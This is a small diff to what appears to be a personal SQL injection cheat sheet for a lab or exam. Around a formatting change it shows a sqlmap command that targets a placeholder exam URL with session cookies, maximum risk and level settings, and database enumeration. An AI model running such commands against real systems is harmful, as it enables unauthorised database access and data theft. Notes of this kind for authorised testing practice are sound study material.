@@ -126,7 +126,8 @@ MySQL & MSSQL:
 ```
 
 SQLMAP options
-```
+
+```js
 magia =  sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*&organizeby=DATE&blog_artist=" --
 cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs
 
